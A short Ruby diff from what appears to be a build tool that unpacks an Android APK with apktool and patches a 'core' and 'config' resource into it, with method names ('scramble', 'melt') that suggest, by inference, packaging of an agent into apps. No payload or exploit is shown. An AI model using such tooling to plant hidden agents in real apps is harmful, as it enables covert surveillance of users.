@@ -22,12 +22,12 @@ class BuildAndroid < Build
 
     trace :debug, "Build: apktool extract: #{@tmpdir}/apk"
 
-    apktool = File.join @tmpdir, 'apktool.jar'
-    core = File.join @tmpdir, 'core'
+    apktool = path('apktool.jar')
+    core = path('core')
 
     system "java -jar #{apktool} d #{core} #{@tmpdir}/apk" || raise("cannot unpack with apktool")
 
-    if File.exist?(File.join(@tmpdir, 'apk/res/raw/resources.bin'))
+    if File.exist?(path('apk/res/raw/resources.bin'))
       @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
     else
       raise "unpack failed. needed file not found"
@@ -43,16 +43,14 @@ class BuildAndroid < Build
     params[:core] = 'apk/res/raw/resources.bin'
     params[:config] = 'apk/res/raw/config.bin'
 
+    puts File.read path('apk/res/raw/resources.bin')
+    
     # invoke the generic patch method with the new params
     super
 
   end
 
-  def scramble
-    trace :debug, "#{self.class} #{__method__}"
-  end
-
-  def melt
+  def melt(params)
     trace :debug, "#{self.class} #{__method__}"
   end
 
